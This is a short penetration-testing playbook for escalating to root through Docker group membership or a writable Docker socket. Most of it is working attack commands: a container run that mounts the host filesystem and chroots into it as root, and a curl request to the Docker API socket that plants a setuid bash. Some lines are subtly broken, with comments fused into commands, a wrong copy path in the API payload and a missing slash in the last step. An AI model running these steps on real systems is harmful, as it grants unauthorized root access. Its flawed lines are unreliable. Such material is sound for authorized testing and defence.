# Docker Daemon Privilege Escalation

## When to Use
- During a Linux local privilege escalation phase.
- When you have a shell as a non-root user who is a member of the `docker` group.
- When you discover a writable Docker socket (e.g., `/var/run/docker.sock`) mounted inside a container or accessible on the host.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Enumeration

```bash
# Concept: Check if the current user is in the docker group or if the socket is writable. id
# Output: uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# Check socket permissions ls -l /var/run/docker.sock
# Output: srw-rw---- 1 root docker 0 Oct 26 10:00 /var/run/docker.sock
```

### Phase 2: Exploitation via Docker CLI

If the `docker` command is available:
```bash
# docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# id
# Output: uid=0(root) gid=0(root) groups=0(root)
```
*(Explanation: This mounts the host's root filesystem `/` into the container at `/mnt` and drops you into a shell inside the container but chrooted to the host's filesystem as root).*

### Phase 3: Exploitation via API (Curl)

If the `docker` CLI tool is not installed, but you can write to the socket:
```bash
# curl -X POST -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh -c \"cp /bin/bash /mnt/tmp/bash && chmod +s /mnt/tmp/bash\""],"Binds":["/:/mnt"]}' --unix-socket /var/run/docker.sock http://localhost/containers/create

# Start the container curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start

# Execute the SUID binary on the host tmp/bash -p
```
